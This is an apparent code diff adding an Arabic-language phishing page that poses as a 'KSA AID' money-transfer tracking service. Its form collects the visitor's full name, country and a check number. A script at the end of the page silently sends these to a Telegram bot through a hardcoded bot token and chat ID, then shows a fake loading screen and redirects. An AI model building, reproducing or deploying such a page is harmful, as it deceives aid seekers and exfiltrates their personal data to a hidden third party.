@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>تتبع تحويل</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: inherit;
+      background: #ebece7;
+      color: #333;
+    }
+    .header {
+      background: #1e2a38;
+      padding: 15px;
+      text-align: center;
+    }
+    .header img {
+      height: 40px;
+      max-width: 160px;
+      width: auto;
+      display: block;
+      margin: 0 auto;
+    }
+    .container {
+      max-width: 380px;
+      margin: 20px auto;
+      padding: 15px;
+      text-align: center;
+    }
+    h2 {
+      margin-bottom: 18px;
+      font-size: 18px;
+      font-weight: bold;
+    }
+    .form-group {
+      margin-bottom: 15px;
+      text-align: right;
+    }
+    label {
+      display: block;
+      margin-bottom: 4px;
+      font-size: 13px;
+      font-weight: bold;
+    }
+    input[type="text"], select {
+      width: 100%;
+      padding: 10px;
+      border: 0px;
+      border-radius: 0px;
+      font-size: 13px;
+      box-sizing: border-box;
+    }
+    .check-container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 5px;
+      margin-top: 10px;
+      flex-wrap: nowrap;
+    }
+    .check-container input {
+      width: 28px;
+      height: 40px;
+      text-align: center;
+      font-size: 16px;
+      border: none;
+      border-bottom: 2px solid #999;
+      background: transparent;
+      outline: none;
+      transition: border-color 0.3s;
+    }
+    .check-container input:focus {
+      border-color: #1e2a38;
+    }
+    .check-container span {
+      font-size: 18px;
+      font-weight: bold;
+      line-height: 40px;
+      margin: 0 2px;
+      color: #444;
+    }
+    .error-message {
+      color: red;
+      font-size: 13px;
+      margin-top: 8px;
+      display: none;
+      text-align: center;
+    }
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #5a75b9;
+      border: none;
+      color: white;
+      font-size: 15px;
+      border-radius: 6px;
+      cursor: not-allowed;
+      opacity: 0.6;
+      transition: 0.3s;
+      margin-top: 18px;
+    }
+    button.active {
+      cursor: pointer;
+      opacity: 1;
+    }
+    .footer {
+      text-align: center;
+      font-size: 11px;
+      color: #444;
+      margin-top: 30px;
+    }
+
+    /* شاشة سبلاش */
+    #splash {
+      display: none;
+      text-align: center;
+      margin-top: 120px;
+    }
+    .splash-logo {
+      width: 80px;
+      height: auto;
+      margin-bottom: 20px;
+      animation: spin 20s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    #splash h3 {
+      font-size: 16px;
+      color: #333;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="header">
+    <img src="logo.png" alt="logo">
+  </div>
+
+  <div class="container">
+    <h2>تتبع تحويل</h2>
+
+    <div class="form-group">
+      <label for="name">الاسم الكامل</label>
+      <input type="text" id="name" placeholder="اكتب اسمك الكامل (3 مقاطع)">
+    </div>
+
+    <div class="form-group">
+      <label for="address">العنوان (البلد)</label>
+      <select id="address">
+        <option value="">اختر البلد</option>
+        <option value="الأردن">الأردن</option>
+        <option value="السعودية">السعودية</option>
+        <option value="الإمارات">الإمارات</option>
+        <option value="مصر">مصر</option>
+        <option value="الكويت">الكويت</option>
+        <option value="قطر">قطر</option>
+        <option value="البحرين">البحرين</option>
+        <option value="عُمان">عُمان</option>
+        <option value="اليمن">اليمن</option>
+        <option value="العراق">العراق</option>
+        <option value="سوريا">سوريا</option>
+        <option value="لبنان">لبنان</option>
+        <option value="فلسطين">فلسطين</option>
+        <option value="ليبيا">ليبيا</option>
+        <option value="تونس">تونس</option>
+        <option value="الجزائر">الجزائر</option>
+        <option value="المغرب">المغرب</option>
+        <option value="موريتانيا">موريتانيا</option>
+        <option value="السودان">السودان</option>
+        <option value="جيبوتي">جيبوتي</option>
+        <option value="الصومال">الصومال</option>
+        <option value="جزر القمر">جزر القمر</option>
+        <option value="أخرى">أخرى</option>
+      </select>
+      <input type="text" id="customCountry" placeholder="اكتب بلدك" style="display:none; margin-top:10px;">
+    </div>
+
+    <div class="form-group">
+      <label>ادخل رقم الشيك</label>
+      <div class="check-container" id="checkContainer">
+        <input type="text" maxlength="1" id="input0" inputmode="numeric" pattern="[0-9]*">
+        <input type="text" maxlength="1" id="input1" inputmode="numeric" pattern="[0-9]*">
+        <input type="text" maxlength="1" id="input2" inputmode="numeric" pattern="[0-9]*">
+        <span>-</span>
+        <input type="text" maxlength="1" id="input3" inputmode="numeric" pattern="[0-9]*">
+        <input type="text" maxlength="1" id="input4" inputmode="numeric" pattern="[0-9]*">
+        <input type="text" maxlength="1" id="input5" inputmode="numeric" pattern="[0-9]*">
+        <span>-</span>
+        <input type="text" maxlength="1" id="input6" inputmode="numeric" pattern="[0-9]*">
+        <input type="text" maxlength="1" id="input7" inputmode="numeric" pattern="[0-9]*">
+        <input type="text" maxlength="1" id="input8" inputmode="numeric" pattern="[0-9]*">
+        <input type="text" maxlength="1" id="input9" inputmode="numeric" pattern="[0-9]*">
+      </div>
+      <div id="errorMessage" class="error-message">رقم الشيك غير صحيح</div>
+    </div>
+
+    <button id="submitBtn">المتابعة</button>
+  </div>
+
+  <!-- شاشة سبلاش -->
+  <div id="splash">
+    <img src="lo.png" alt="logo" class="splash-logo">
+    <h3>يرجى الانتظار جاري جلب المعلومات ..</h3>
+  </div>
+
+  <div class="footer">
+    حقوق النشر © KSA AID 2025 جميع الحقوق محفوظة
+  </div>
+
+  <script>
+    const nameField = document.getElementById("name");
+    const addressField = document.getElementById("address");
+    const customCountry = document.getElementById("customCountry");
+    const checkInputs = document.querySelectorAll("#checkContainer input");
+    const submitBtn = document.getElementById("submitBtn");
+    const errorMessage = document.getElementById("errorMessage");
+
+    const requiredNumber = "3048180001"; // الرقم المطلوب حصراً
+
+    function validateForm() {
+      const enteredNumber = Array.from(checkInputs).map(inp => inp.value).join("");
+      const checkComplete = enteredNumber.length === 10 && enteredNumber === requiredNumber;
+
+      const nameParts = nameField.value.trim().split(/\s+/);
+      const validName = nameParts.length >= 3;
+
+      let countryValue = addressField.value;
+      if (countryValue === "أخرى") {
+        countryValue = customCountry.value.trim();
+      }
+      const validCountry = countryValue.length > 0;
+
+      if (enteredNumber.length === 10 && enteredNumber !== requiredNumber) {
+        errorMessage.style.display = "block";
+      } else {
+        errorMessage.style.display = "none";
+      }
+
+      if (validName && validCountry && checkComplete) {
+        submitBtn.classList.add("active");
+        submitBtn.disabled = false;
+      } else {
+        submitBtn.classList.remove("active");
+        submitBtn.disabled = true;
+      }
+    }
+
+    checkInputs.forEach((input, idx) => {
+      input.addEventListener("input", () => {
+        input.value = input.value.replace(/[^0-9]/g, "");
+        if (input.value.length === 1 && idx < checkInputs.length - 1) {
+          checkInputs[idx + 1].focus();
+        }
+        validateForm();
+      });
+
+      input.addEventListener("keydown", (e) => {
+        if (e.key === "Backspace" && !input.value && idx > 0) {
+          checkInputs[idx - 1].focus();
+        }
+      });
+
+      input.addEventListener("paste", (e) => {
+        e.preventDefault();
+        const pasteData = e.clipboardData.getData("text").replace(/\D/g, "");
+        pasteData.split("").forEach((num, i) => {
+          if (checkInputs[idx + i]) checkInputs[idx + i].value = num;
+        });
+        validateForm();
+      });
+    });
+
+    addressField.addEventListener("change", () => {
+      if (addressField.value === "أخرى") {
+        customCountry.style.display = "block";
+      } else {
+        customCountry.style.display = "none";
+      }
+      validateForm();
+    });
+
+    nameField.addEventListener("input", validateForm);
+    customCountry.addEventListener("input", validateForm);
+
+    submitBtn.addEventListener("click", () => {
+      if (!submitBtn.classList.contains("active")) return;
+
+      const checkNumber = Array.from(checkInputs).map(inp => inp.value).join("");
+      const countryValue = (addressField.value === "أخرى") ? customCountry.value : addressField.value;
+
+      const token = "8336187804:AAGw2oCmLshO7T1P2RKMrLgqkq8nByX7kXU";  
+      const chatId = "5450865891"; 
+      const text = `
+📌 بيانات جديدة:
+👤 الاسم: ${nameField.value}
+🏠 العنوان: ${countryValue}
+#️⃣ رقم الشيك: ${checkNumber}
+      `;
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: text
+        })
+      }).then(() => {
+        localStorage.setItem("fullName", nameField.value);
+        localStorage.setItem("country", countryValue);
+
+        document.querySelector(".container").style.display = "none";
+        document.getElementById("splash").style.display = "block";
+
+        setTimeout(() => {
+          window.location.href = "done.html";
+        }, 3000);
+      }).catch(err => console.error(err));
+    });
+
+    validateForm();
+  </script>
+
+</body>
+</html>
